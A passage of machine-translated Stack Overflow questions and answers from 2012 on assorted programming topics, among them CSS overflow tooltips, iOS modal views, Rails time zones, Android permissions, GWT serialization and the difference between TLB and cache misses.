    content: attr(data-name); 
    color: black;
    position: absolute;
    top: -150px;;
    left: 0;   
} 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-04T09:42:20.723

不幸的是，没有（简单的）方法可以让子标签覆盖`overflow:hidden`父 div 上的声明效果。请参阅：[允许特定标签覆盖溢出：隐藏](https://stackoverflow.com/questions/8837050/allow-specific-tag-to-override-overflowhidden)

您唯一可能的办法是使用 javascript：首先获取跨度相对于文档的偏移量，然后将其移动到 DOM 中的另一个位置（即直接子到正文），将其位置设置为绝对，并使用您抓取的偏移量设置它的 left 和 top 属性，这会将它定位在文档中的相同位置，但现在它不包含在 div 中，因此不再需要服从`overflow:hidden`。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2017-07-03T19:52:37.073

您可以使用`margin-top`和`padding-top`。

`padding-top`将扩展您的父区域，但负数`margin-top`会将其保持在预期位置。

看起来你正在逃避溢出，但实际上你没有。

```
div {
    width:500px;
    height:200px;
    background:red;
    margin: 50px;
    overflow: hidden; /* this rule */

    background-clip: content-box; /*use this to constrain the background color within the content-box and do not paint the padding */
    padding-top: 200px; /* space required to display the tooltip */
    margin-top: -150px; /*200px - 50px of the original margin*/
}

span {
 background: blue;
 color: white;
 position: relative;
 top:100px;  
 display:block;   
 width: 100px;  
 margin: auto;    
}

span:hover:after {
    content: attr(data-name); 
    color: black;
    position: absolute;
    top: -150px;;
    left: 0;   
}
```

```
<div>
<span data-name="here">hover</span>
</div>
```

这可能会引入指针事件问题，但您可以使用`pointer-events`then 修复它们。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-07-05T02:52:32.123

我正在使用简单**的 z-index**来强制元素悬停以转义父元素。请检查

```
div {
 width:500px;
height:200px;
 background:red;   
    margin: 50px;
    overflow: hidden; /* this rule */
}

span {
 background: blue;
color: white;
    position: relative;
 top:100px;  
display:block;   
width: 100px;  
margin: auto;    
}

span:hover:after {
 content: attr(data-name); 
color: black;
 position: fixed; /* Here I replaced position abosolute to fixed */
top: 10px;  /* Here I replaced top -150px  to 10px */
 left: 250px;  /* Here I replaced positionleft 0 to 250px */
 z-index:99999;} /* Here I added new z-index property to 99999 */
```

```
<div>
<span data-name="here">hover</span>
</div>
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T09:51:17.580

我不确定您想要了解什么，但我重新创建了一个工具提示框架供您查看。我称之为 :hover 和与之关联的 .class 基本上是烟雾和镜子。

[http://jsfiddle.net/WE8Dw/](http://jsfiddle.net/WE8Dw/)

希望这可以帮助。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-04T09:57:30.203

如果将其设置为`overflow:hidden;`. 可能的 CSS 选项是使用同级元素到已`overflow:hidden;`设置并将其显示为弹出窗口的元素。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-02-07T16:03:07.907

在某些情况下，您可以使用`div{position: absolute;}`

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2013-11-07T14:13:18.743

您可以将孩子的位置设置为固定。

# iphone - 以模态方式呈现 ViewController

> ID：10446291
> 
> 赞同：0
> 
> 时间：2012-05-04T09:33:46.500
> 
> 标签：iphone, ios, xcode, view, switch-statement

我正在制作文字游戏，我需要一些导航方面的帮助。该游戏从一个菜单开始，从该菜单中您可以单击“创建游戏”，这将打开“GameViewController”。在这个 GameViewController 中，当它是正确的单词时，您可以提交一个单词。 弹出一个屏幕，它是“RightWordViewController” 当它错了它会弹出“WrongwordViewController”，无论是对还是错都有一个按钮可以返回游戏。

在 GameViewController 中还有一个菜单按钮，除了你提交了一个词之后，它可以完美地工作。如果您在提交正确或错误的单词时单击 GameViewController 中的菜单按钮，菜单按钮会将我带回到正确或错误的视图控制器。我明白为什么会发生这种情况，我只是不知道如何解决它。我使用dismissModalViewcontroller，它向我展示了当前视图背后的视图，这是正确或错误的视图控制器，我需要解决这个问题，希望有人能帮助我。

从菜单转到游戏

```
-(IBAction)switchview:(id)sender {
 GameViewController *game = [[GameViewController alloc] initWithNibName:nil bundle:nil];
[self presentModalViewController:game animated:YES]; 
```

从 GameViewcontroller 到主视图（菜单）的菜单按钮（它会关闭当前屏幕，因此当我提交正确或错误的单词时，这些屏幕会弹出，当我单击此按钮时，正确或错误会再次出现。 . 我不想要的东西。）

```
-(IBAction)switchback:(id)sender {[self dismissModalViewControllerAnimated:YES]; 
```

对或错我使用：

```
if ([labelsText.text isEqualToString: textview.text]){

RightWordViewController *Rightword = [[RightWordViewController alloc] initWithNibName:nil bundle:nil];
[self presentModalViewController:RightWord animated:YES];
}

else
{  WrongWordViewController *Wrongword = [[WrongWordViewController alloc]     initWithNibName:nil bundle:nil];
    [self presentModalViewController:WrongWord animated:YES];
} 
```

然后当我在正确或错误视图控制器中时返回游戏屏幕

```
-(IBAction)switchback3:(id)sender {
GameViewController *game = [[GameViewController alloc] initWithNibName:nil bundle:nil];
[self presentModalViewController:game animated:YES]; 
```

我希望有人能给我一些非常清楚的解释或一些示例代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T09:47:01.650

在 switchback3: 方法中，您不需要再次预设视图控制器..只需关闭前面的那个..

```
[self dismissModalViewControllerAnimated:YES]; 
```

另外，在游戏视图控制器中添加一个布尔值来设置一个状态来检查是否显示/不显示正确/错误的视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T12:28:46.407

使用 -(IBAction)switchback3:(id)sender { [self dismissModalViewControllerAnimated:YES];

在呈现正确/错误的视图控制器之前重置您提交的单词。如果您正在呈现一个视图并且您需要返回，请使用dismissModalViewController。无需再次呈现该视图。

# ruby-on-rails - Rails：如何在特定时区创建时间对象

> ID：10446292
> 
> 赞同：4
> 
> 时间：2012-05-04T09:33:52.850
> 
> 标签：ruby-on-rails, ruby, datetime, timezone, tzinfo

我的应用程序在“莫斯科”（+04:00）时区工作。但有时我只需要按本地时间（例如“2012 年 5 月 1 日 13:45”）和 ActiveSupport::TimeZone 对象的名称（例如“柏林”：夏令时 +02:00 和 +01： 00 否则）。

例如，如果我得到“2012 年 5 月 1 日 13:45”和“柏林”作为输入，我想产生“2012-05-01 13:45:00 +0200”或“2012-05-01 11:45:00 + 0000”。我创建以下功能：

```
def from_local_datetime(local_datetime, time_zone)
  offset = Time.now.in_time_zone(time_zone).formatted_offset
  datetime = case local_datetime
  when String
    DateTime.parse(local_datetime)
  else
    DateTime.new(local_datetime)
  end.change(:offset => offset)

  return datetime
end 
```

乍一看，它按我的预期工作。但它是此类任务的最佳实践吗？可能在某些情况下它适用于错误。我不确定。

我会很感激任何评论。

**UPD：**我认为 DST 更改时间时可能会出现错误。例如，2011 年 3 月 26 日是柏林时区的 GMT+1 并`Time.now.in_time_zone("Berlin").formatted_offset`返回“GMT+1”，但 2011 年 3 月 27 日将是 GMT+2。因此，如果我在 3 月`from_local_datetime("28 march 2011", "Berlin")`27 日之前调用它会返回`28 march 2011 00:00:00 +0100`，但如果我在更改后调用它我的函数返回的时间`28 march 2011 00:00:00 +0200`:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T11:13:10.617

您的转换方法是正确的方法。

对于网站，您应该确保将时间以 UTC 格式存储在数据库中。如果您可以从数据库中获取 UTC 值，而不是本地时间（或者您可以将 Web 服务器的时区设置为 UTC），那么您在去的时候就不必将时间从 UTC 转换为本地时间然后无论如何将其转换为用户的时区。

而且，当然，您必须存储用户的时区偏好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-02-21T06:25:41.510

```
TZInfo::Timezone.get('Europe/London') 
```

查找时区

```
http://api.rubyonrails.org/classes/ActiveSupport/TimeZone.html 
```

# android - 是否可以将所有应用程序的数据存储在 sdcard 中？

> ID：10446294
> 
> 赞同：1
> 
> 时间：2012-05-04T09:33:59.900
> 
> 标签：android

我们需要在 sdcard 上创建自己的文件结构来存储首选项文件、数据库文件和文件吗？

这可能吗 ？我知道我们可以将文件存储在 sdcard 上的任何位置，但不确定 SQLiteDatabase 文件和共享首选项文件。

请给我这方面的建议。

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T09:57:50.400

是的，在开发应用程序时有可能。在清单中只需给出

```
android:installLocation="preferExternal" 
```

然后应用程序和应用程序的文件将直接写入设备的外部存储设备，即 SD 卡。您将有两个选项“auto”和“intenalOnly”，就像这样

```
<manifest xmlns:android="*******************"
package="*************"
android:versionCode="1"
android:installLocation="auto"
android:versionName="1.0" >

<uses-sdk android:minSdkVersion="8" />

<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
<uses-permission android:name="android.permission.INTERNET"/> 
```

# java - 如何序列化超类和可序列化类的字段

> ID：10446296
> 
> 赞同：1
> 
> 时间：2012-05-04T09:34:24.547
> 
> 标签：java, gwt, serialization, gwt-rpc

我有一些与 GWT 的 RPC 机制一起使用的可序列化对象。我决定让它们都成为一个包含公共字段（例如“id”、“revision”等）的对象的子类。但是，我注意到 GWT 不会序列化超类的字段，所以我只获取每个超类客户端的类字段为空。

我怎样才能让超类字段也被序列化，而不必为我的每一个 Serializable 类编写一个 CustomFieldSerializer？是否可以？

**例子：**

```
public class Super {
    private String id;

    public String getId() {
        return id;
    }

}

public class Sub extends Super implements Serializable {
    private String name;

    // more stuff here
}

// on the client side, inside an AsyncCallback
onSuccess(Sub sub) {
    assert(sub.getId() != null);
} 
```

因此，当我通过 GWT 的 RPC 机制将其发送到客户端时，我会在任何 Sub 实例的“id”字段中得到一个空值。我确保在服务器中，id 不为空。我还尝试让超类实现 Serializable，但没有运气。

欢迎任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:47:00.047

要序列化 ​​gwt 中的任何类，您必须在超类中实现 Serializable。

要传递一个 bean，您必须满足以下要求（来自 GWT 站点）：

1.它直接实现Java Serializable 或GWT IsSerializable 接口，或者因为它派生自一个超类。

2.它的非最终的、非瞬态的实例字段本身是可序列化的

3.它有一个带有任何访问修饰符的默认（零参数）构造函数（例如 private Foo(){} 将起作用）

问题可能有不同的原因。

1.验证类是否有默认构造函数（不带参数）

2.验证该类实现了Serializable或IsSerializable或实现了扩展Serializable的接口或扩展了实现Serializable的类

3.验证该类是否在客户端。*包或...</p>

4.验证，如果类不在client.*包中，那是在你的GWT xml模块定义中编译的。默认情况下存在。如果您的课程在另一个包中，则必须将其添加到源代码中。例如，如果您的课程在 domain.* 下，您应该将其添加到 xml 作为 . 请注意，该类不能属于服务器包！

5.如果您包含来自另一个 GWT 项目的类，您必须将继承添加到您的 xml 模块定义中。例如，如果你的类 Foo 在包 com.dummy.domain 中，你必须添加到模块定义中。

6.如果您将来自另一个 GWT 项目的类作为 jar 发布，请验证该 jar 是否还包含源代码，因为 GWT 还重新编译传递给客户端的类的 Java 源。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T21:25:43.040

如果你想让 Super 中的数据被序列化，你必须让它 Serializable。

# javascript - 支持seo的部分更新

> ID：10446298
> 
> 赞同：0
> 
> 时间：2012-05-04T09:34:27.840
> 
> 标签：javascript, node.js, seo

使用 NodeJs 我正在尝试做一些与 Meteor 非常相似的事情：我只想发送页面中实际更改的部分。我的困境是我知道如何创建这样一个框架来响应链接点击并发送部分更新，但是这样一个框架不能满足直接浏览到索引以外的页面（这是搜索引擎和人们所需要的）无需 javascript 即可使用您的网站）。

我还可以弄清楚如何制作一个框架来支持整个页面重新加载、把手和一个简单的节点服务器实例来解决这个问题。Hoeever，我不知道如何创建一种方法，允许我编写一种方法来告诉框架页面的部分更新，并让框架找出还需要加载的内容。

我能想到的一种方法是每次都创建索引页面（对于整个页面加载）并对其应用部分更新，但如果子页面与非常拥挤的索引有很大不同，这很快就会变得昂贵。

示例方法如下所示：

```
function images(id) {
    if (id == null) {
        // load all images from database
        template.images = db.result();
        template.content = template.loadblock('gallery');
    }
    else {
        // retrieve single image
        template.content = template.loadblock('single_image');
        template.image = db.result();
    }
} 
```

在 partisl updste 上调用 domain.com/images 的这个方法会很好，因为很明显发生了什么变化。对于整个页面加载，此函数会丢失页眉、页脚、导航等内容。

在答案中，我会寻找一个已完成此操作的示例或一些可以为我指明正确方向的提示。对于我在 ipad 上写这篇文章的任何错别字，我深表歉意。如果您对我的问题有任何疑问，请提出，我会根据需要进行更新。

**更新：** 解决方案的一个可能示例可能是以下代码。这是给一个想法，它可能不会真正运行

```
// As a convention, don't pass around raw values if they aren't static but pass around functions such as
data.images = function () {
    // run db query
    // return an object with the images
}
// This constraint might be limited to the index() method

var routes = {
// This now allows us to do things like this:
index: function() { 
    var data;
    // Initialise everything needed for the index
    data.title = 'Index';
    data.nav = { Index: '/', Images: '/images' };
    data.content = 'Hello World';
},

categories: function() {
    var data;
    data.content = render('gallery', function () { /* load and return images as object */ }); // Not sure about this dynamic subtemplating but oh well
}

// This now allows us to do the following:
function request(page, type) {
    if (type == 'update') {
        if (routes[page] != undefined && typeof routes[page] == 'function') {
            respond(routes[page]());
        }
    }
    else {
        if (routes[page] != undefined && typeof routes[page] == 'function') {
            var data = mergeArrays(routes['index'](), routes[page]());
            // index.html which is just a Handlebars template
            respond(data);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:46:37.087

这是我经常使用的模式（在 Express 应用程序中）：

```
function respond(req, res, name, resource) {
    if(req.accepts('json')) {
        // Send JSON to clients who want it
        res.send(resource);
    } else {
        // Render with layout only for non-XHR requests
        resource.layout = !req.xhr;
        res.render('resources/' + name, resource);
    }
} 
```

示例用法：

```
app.get('/images', function(req, res, next) {
  getImages(function(err, images) {
    if(err) return next(err);

    respond(req, res, 'images', images);
  });
});

app.get('/images/:id', function(req, res, next) {
  getImage(req.params.id, function(err, image) {
    if(err) return next(err);

    respond(req, res, 'image', image);
  });
}); 
```

图像.玉：

```
img(src=uri, alt=title) 
```

图像.玉：

```
#gallery
  for image in images
    include image 
```

请求 JSON 的客户会得到它，否则只有当它是非 XHR 请求时他们才会得到整个页面。XHR 请求仅获取所请求资源的 HTML 片段。这适用于非常简单的应用程序，其中资源主要对应于页面。

# android - 使用android应用程序时防止屏幕锁定调光/待机？

> ID：10446299
> 
> 赞同：4
> 
> 时间：2012-05-04T09:34:31.567
> 
> 标签：android, locking, screen

我正在开发一个应用程序，我需要对其进行的最后一次触摸是在设备进入待机状态（屏幕关闭）时防止屏幕锁定。与谷歌导航的确切行为。

我想知道，在使用该应用程序时，我必须以编程方式使用什么来保持此功能始终处于启用状态？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-04T10:10:35.917

将以下代码写入您的 xml 文件将防止屏幕锁定

```
android:keepScreenOn="true" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T10:10:01.567

在 setContentView 之后的活动的 onCreate 中使用：

getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

自己没试过。

# performance - TLB 未命中与缓存未命中？

> ID：10446301
> 
> 赞同：26
> 
> 时间：2012-05-04T09:34:36.717
> 
> 标签：performance, caching, operating-system, cpu-architecture, tlb

有人可以解释一下 TLB（翻译后备缓冲区）未命中和缓存未命中之间的区别吗？

我相信我发现 TLB 指的是某种虚拟内存地址，但我并不太清楚这实际上意味着什么？

我理解当一块内存（缓存行的大小）被加载到（L3？）缓存中并且如果当前缓存行中没有保存所需的地址时会导致缓存未命中 - 这是缓存未命中。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-05-04T09:39:45.900

嗯，今天所有的现代操作系统都使用一种叫做虚拟内存的东西。CPU生成的每个地址都是虚拟的。存在将这种虚拟地址映射到物理地址的页表。TLB 只是页表条目的缓存。

另一方面，L1、L2、L3 缓存缓存主存内容。

当 CPU 请求的虚拟地址的映射`virtual memory address => physical memory address`不在 TLB 中时，就会发生 TLB 未命中。然后该条目必须从页表中提取到 TLB 中。

当 CPU 需要不在缓存中的内容时，就会发生缓存未命中。然后在主存储器 (RAM) 中查找数据。如果不存在，则必须从辅助存储器（硬盘）中获取数据。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-05-02T17:26:09.700

在PC中加载第一个指令地址（即虚拟地址）后的以下顺序使TLB未命中和缓存未命中的概念非常清晰。

第一条指令 • 访问第一条指令

*   拿启动电脑
*   使用从 PC 中提取的 VPN 访问 iTLB：iTLBmiss
*   调用 iTLBmiss 处理程序
*   计算PTE地址
*   如果 PTE 缓存在 L1 数据和 L2 缓存中，请使用 PTE 地址查找它们：您也会错过那里
*   访问主存页表：PTE无效：缺页
*   调用页面错误处理程序
*   分配页框，从磁盘读取页面，更新 PTE，在 iTLB 中加载 PTE，重新开始获取 • 现在你有了物理地址

*   访问 Icache：错过

*   向更高级别发送补充请求：您到处都想念
*   向内存控制器发送请求（北桥）
*   访问主存
*   读取缓存行
*   当缓存线返回处理器时重新填充所有级别的缓存
*   从具有块偏移的高速缓存行中提取适当的指令 • 这是指令/数据访问中可能的最长延迟

来源[https://software.intel.com/en-us/articles/recap-virtual-memory-and-cache](https://software.intel.com/en-us/articles/recap-virtual-memory-and-cache)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-20T07:54:57.810

提到了这两个过程的方式。就性能而言，缓存未命中不一定会使 CPU 停顿。使用算法预取技术可以容忍少量缓存未命中。然而，TLB 未命中会导致 CPU 停顿，直到 TLB 已用新地址更新。换句话说，预取可以屏蔽缓存未命中，但不能屏蔽 TLB 未命中。

# c# - 将值传递到文本框

> ID：10446303
> 
> 赞同：0
> 
> 时间：2012-05-04T09:34:42.910
> 
> 标签：c#, silverlight, textbox, childwindow

我正在使用 Silverlight，并将值传递到子窗口中的文本框中，

该`textBox1_TextChanged`事件应该触发一个 Web 服务调用，该调用应该在子窗口上填充一个列表框，但是由于某种原因，当子窗口加载时，文本框有根据需要传递给它的值，但由于某种原因，`TextChanged`事件没有触发？

这有什么具体原因吗？

这是更改事件 -

```
private void textBox1_TextChanged(object sender, TextChangedEventArgs e)
    {
        WebService.Service1SoapClient client = new WebService.Service1SoapClient();
        client.PRSHListCompleted += new EventHandler<PRSHListCompletedEventArgs>(client_PRSHListCompleted);
        client.PRSHListAsync(System.Convert.ToInt16(textBox1.Text));

        textBox2.Text = "OK"; //I did this to test if I was getting to the event and it failed.
    } 
```

我`textBox1.Text`从这里的父窗口传入-

```
Settings set = new Settings();
set.textBox1.Text = System.Convert.ToString(PRSID);

set.Show(); 
```

`set`子窗口在哪里。

这是文本框的 XAML -

```
<TextBox Grid.Row="1" Height="23" HorizontalAlignment="Left" Margin="12,13,0,0" Name="textBox1" VerticalAlignment="Top" Width="28" TextChanged="textBox1_TextChanged" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T11:04:27.380

您可以在触发事件并进行所有 XAML 事件订阅`textBox1.Text`后设置权限。`Settings.Loaded`

所以试试这个：

```
Settings set = new Settings();
set.Loaded += (o, args) =>
{
    //set.Dispatcher.BeginInvoke(() =>
    //{
    set.textBox1.Text = System.Convert.ToString(PRSID);
    //});
};

set.Show(); 
```

# ios - UITable 滚动不顺畅，单元格在 IOS 中显示错误信息

> ID：10446306
> 
> 赞同：1
> 
> 时间：2012-05-04T09:34:53.640
> 
> 标签：ios, caching, asynchronous, uitableview, loading

我有一个只有 6 个自定义单元格的 UITable。每个 CustomCell 都有一个水平滚动视图，其中包含自定义视图。每个 CustomView 上都有一个 ImageView 和 Text。

所以把它们放在一起它可能看起来像这样

UITable --> CustomCell ---> Horizo​​ntal ScrollView --> CustomView --> ImageView and Text

这是 UITable 中 Cell 的代码

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

    static NSString *MySecondIdentifier = @"MySecondIdentifier";
    UITableViewCell *cell2 = [tableView dequeueReusableCellWithIdentifier:MySecondIdentifier];

    if(cell2 == nil){

        cell2 = [(CustomCell* )[CustomCell alloc]initWithStyle:UITableViewCellStyleDefault reuseIdentifier:MySecondIdentifier target:self row:indexPath.row parent:self]; 

    }
    [cell2 setSelectionStyle:UITableViewCellSelectionStyleNone];
    [cell2 setValueToCellViewItem:tempTitleString setOfImage:dictCatData];
    return cell2;

} 
```

其中 DictCatData = NSMutableArray 的数据节点和 tempTitleString = 单元格的标题字符串（将其用于其他目的）

这是我设置 CustomCell 值的方法

```
- (void) setValueToCellViewItem:(NSString *)pTitle setOfImage:(NSMutableArray *)catData{
[the_pScrolView setContentSize:CGSizeMake([catData count] * 107 , 107)];

int counter = 0;
for(NSDictionary *tempDict in catData){

    NSString *url = [[NSString alloc]init];
    url = [tempDict objectForKey:@"main_img_url"];
    url = [url stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];

    UIImageView *mSdWebImage = [[UIImageView alloc] initWithFrame:CGRectMake(counter * 107, 0, 107, 107)];
    [mSdWebImage setImageWithURL:[NSURL URLWithString:url] placeholderImage:nil];
    [mSdWebImage setBackgroundColor:[UIColor grayColor]];
    [the_pScrolView addSubview:mSdWebImage];

    ///Setting the title properties
    UILabel *the_pLable = [[UILabel alloc] initWithFrame:CGRectMake((counter * 107) + 15, 85, 97, 22)];
    the_pLable.textColor = [UIColor whiteColor];
    the_pLable.font = [UIFont fontWithName:@"Helvetica" size:10.0];
    the_pLable.numberOfLines = 1;
    the_pLable.backgroundColor = [UIColor clearColor];
    the_pLable.text = [tempDict objectForKey:@"title"];

    [the_pScrolView addSubview:the_pLable];
    counter++;

} 
```

我正在使用[SDWebImage](https://github.com/rs/SDWebImage)进行异步下载和缓存，因为我认为这是我们在网上最好的。

ScrollView 可以包含从 0 到 30+ 图像的图像

当我在我的 iPhone 上打开此页面时，我猜图像正在下载并正确缓存，因为我可以毫无困难地看到它们

我的问题是

1.  当我尝试上下滚动表格时，滚动不流畅。那么如何在不影响背景图片下载和缓存的情况下让它更流畅呢

2.  当我向上和向下滚动表格几次时，我猜自定义单元格被重绘，所以没有图像的自定义单元格（即滚动视图中没有自定义视图）显示来自下方/顶部其他自定义单元格的图像。

有时应用程序崩溃，我想这是内存管理的问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-16T22:07:26.490

要修复显示错误图像的重用单元格，只需在调用代码以显示新图像之前删除 cellForRowAtIndexPath 中的图像。这样，如果图像被延迟，至少旧的图像已被删除或隐藏。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-16T21:51:36.743

下载的图片有多大？我有类似的问题（没有额外的水平滚动），我能够通过使用图像的实际缩略图而不是实际图像（在 TableView 中）来修复它。

您可能想尝试在单独的对象中下载、缓存和创建图像的缩略图，然后让 TableViewCell 加载这些图像的缩略图而不是实际的图像。

这对我来说完美地加快了滚动速度。

# android - 在 Android 上使用 aSmack 发送和接收图像

> ID：10446307
> 
> 赞同：1
> 
> 时间：2012-05-04T09:34:59.723
> 
> 标签：android, xmpp, smack, asmack

我开始研究 XMPP 协议并尝试为 Android 制作客户端。如何使用 asmack 发送和接收图像？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T10:49:46.797

您可以使用 aSmack 发送图像，就像使用 Smack 发送任何其他文件一样。如何在 Smack 中使用 XMPP 文件传输记录在[http://www.igniterealtime.org/builds/smack/docs/latest/documentation/extensions/的“文件传输”部分](http://www.igniterealtime.org/builds/smack/docs/latest/documentation/extensions/)

请务必使用最新版本的 asmack 以获得带内字节流支持。

# android - Android - getNetworkInterface 和所需的权限

> ID：10446309
> 
> 赞同：3
> 
> 时间：2012-05-04T09:35:20.877
> 
> 标签：android, networking, permissions

这里有一个奇怪的问题。

我有一个函数可以读取 NetworkInterfaces 并获取 WiFi 接口名称。这在 2 周前正常工作，只有“android.permission.ACCESS_NETWORK_STATE”权限。

本周我主要使用 3G 进行测试，并对整体代码进行了一些小改动，今天我注意到“NetworkInterface.getNetworkInterfaces()”不再起作用，给了我一个“权限被拒绝”的异常。几秒钟后，我亲爱的朋友谷歌告诉我我需要互联网许可......

-> 我从来没有在这个项目中使用过 INTERNET 权限？？？

那么有什么问题呢？有什么方法可以在不使用 Internet 权限的情况下获取 NetworkInterfaces？如果我添加它，它会再次起作用，但我真的不想为此使用它。

```
 Enumeration<NetworkInterface> interfaces = null;
    try {
        interfaces = NetworkInterface.getNetworkInterfaces();
    } catch (SocketException e) {
        e.printStackTrace();
    } 
```

# javascript - Facebook Like Button 在单击 Like 按钮时消失

> ID：10446310
> 
> 赞同：0
> 
> 时间：2012-05-04T09:35:21.710
> 
> 标签：javascript, facebook-like, facebook-javascript-sdk

请注意，下面的代码工作正常，当我点击按钮时，FB Like 按钮可以工作，但是当我刷新页面时，FB Like 按钮和其他随附的统计信息（喜欢的数量，喜欢的人的面孔）消失了

非常感谢任何帮助。谢谢 ！！！

```
<body>
        <script>(function(d, s, id) {
            var js, fjs = d.getElementsByTagName(s)[0];
            if (d.ge`enter code here`tElementById(id)) return;
            js = d.createElement(s); js.id = id;
            js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=38135740xxxxxxx";
            fjs.parentNode.insertBefore(js, fjs);
            }(document, 'script', 'facebook-jssdk'));
        </script>

        <div class="selection">
            <div class="logo">
                <img src="images/NA/jpg" height="100" width="180" />
            </div>
            <h3> <?php echo $favs[0]->name?>'s top five products</h3>
            <?php // print_r($favs[0]);?>
            <div class="selected">
                <div class="product"><img src=<?php echo '"../'.$favs[0]->photo1.'"'?> alt="Image not available" height="175" width ="175"/></div>
                <div class="product"><img src=<?php echo '"../'.$favs[1]->photo1.'"'?> alt="Image not available" height="175" width ="175"/></div>
                <div class="product"><img src=<?php echo '"../'.$favs[2]->photo1.'"'?> alt="Image not available" height="175" width ="175"/></div>
                <div class="product"><img src=<?php echo '"../'.$favs[3]->photo1.'"'?> alt="Image not available" height="175" width ="175"/></div>
            </div>
            <span style="float:left;padding-top: 10px;">Do You like the products above?</span>

            <div id="fb-root"></div>
            <div class="fbLike">
                <fb:like send="false" width="400" show_faces="true"></fb:like>
            </div>

        </div>
        <div class="textDesc">
            <h3>Participate in the Contest & Get to Know us More</h3>
            <p>You can also participate in the contest & get know us more by simply visiting us at</p>
        </div>
    </body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T21:38:41.867

您网站的页面是否受 .htaccess 密码保护？

如果是这样，那可能就是问题所在。我自己也遇到了这个问题，在走了一段错误的路之后，我又回到了我最初的怀疑——htaccess 密码。

我并没有真正查看代码，但我假设按钮设置为在用户点击后让 FB 抓取页面。用密码屏蔽的东西，FB不能刮网页。它没有显示按钮，就好像它没有被点击一样，它什么也不显示 - 这就是我的困惑所在。

更改 htaccess 后，您必须等待 24 小时，以便页面在加载时被 FB 抓取。但是，您可以使用 FB 调试器 (http://developers.facebook.com/tools/debug) 手动抓取各个页面。

# c# - 在按钮单击时从内容更改嵌套母版页中的 Label.Text

> ID：10446314
> 
> 赞同：1
> 
> 时间：2012-05-04T09:35:26.387
> 
> 标签：c#, asp.net, master-pages

这是这种情况。我有一个母版页站点。
包含另一个母版页 Shop.Master 的母版。
在 Shop.Master 中有一个 ContentPlaceHolder 加载 Something.aspx。
在顶级母版页内有一个标签`[lblText]`。
Something.aspx 页面包含一个文本框`[boxInput]`和一个按钮`[btnButton]`。
我想要完成的是当我单击按钮时`[btnButton]`，值`lblText.Text`被设置为`[boxInput]`.

这是问题的抽象视图。 ![在此处输入图像描述](../Images/5c2750f71da2b3021ad3ebf24e896346.png)

我希望你们能帮助我。谷歌这次并没有提供很大的帮助。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:43:48.580

试试这样。可能有帮助吗

```
 ContentPlaceHolder plchldr= this.Master.Master.FindControl("YourMainMasterContentID") as ContentPlaceHolder;
            Label lbl = plchldr.FindControl("lblText") as Label;
             if(lbl !=null)
             { 
               lbl.Text="SomeText"
             } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:39:07.860

这通常是一个有点奇怪的问题。我过去能够解决这个问题的唯一方法是：

```
((MasterPageType)this.Master).lblText = "Whatever"; 
```

根据您的具体情况，您可能需要冒泡两个母版页：

```
((MasterPageRootType)((MasterPageType)this.Master).Master).lblText = "Whatever"; 
```

如果您将 Masterpage 更改为其他类型，这显然会失败。

（自从我做 WebForms 以来，我已经很久了，如果这不是 100%，请原谅我）

# ruby-on-rails - 嵌套属性 has_many 传递和收集 id 来构建模型

> ID：10446322
> 
> 赞同：1
> 
> 时间：2012-05-04T09:36:14.860
> 
> 标签：ruby-on-rails, nested-forms

我有这个表格：

```
<% form_tag add_expt_details_samples_path, :method => :post do %>
    <% for sample in @samples %>
        <% if sample.study_id == @study.id %>
            <% fields_for "samples[]", sample do |form| %>
                <fieldset>
                    <legend>Sample Name: <%= sample.name %></legend>
                    <p><center><%= form.label :sample_title %>
                    <%= form.text_field :sample_title, :size => 25 %></center></p>
                    <table>
                        <tr>
                            <td>
                                <%= form.label :taxon_id %>
                                <%= form.text_field :taxon_id, :size => 15 %>
                            </td>
                            <td>
                                <%= form.label :scientific_name %>
                                <%= form.text_field :scientific_name, :size => 20 %>
                            </td>
                            <td>
                                <%= form.label :common_name %>
                                <%= form.text_field :common_name, :size => 15 %>
                            </td>
                        </tr>
                    </table>
                    <p>
                        <center>
                            <%= form.label :sample_descripition %><br \>
                            <%= form.text_area :description %>
                        </center>
                    </p>
                </fieldset>
             <% end %>
        <% end %>
    <% end %>
        <p><center><%= submit_tag "Next" %></center></p>
<% end %> 
```

我想在 add_expt_details 操作中收集 samples[]，以便我可以呈现一个 post 方法视图，以便为 samples[] id 添加新的模型记录。

我的动作如下

```
def add_expt_details
    # Collect the samples that were sent
    @expt_samples = Sample.find(params[:samples])
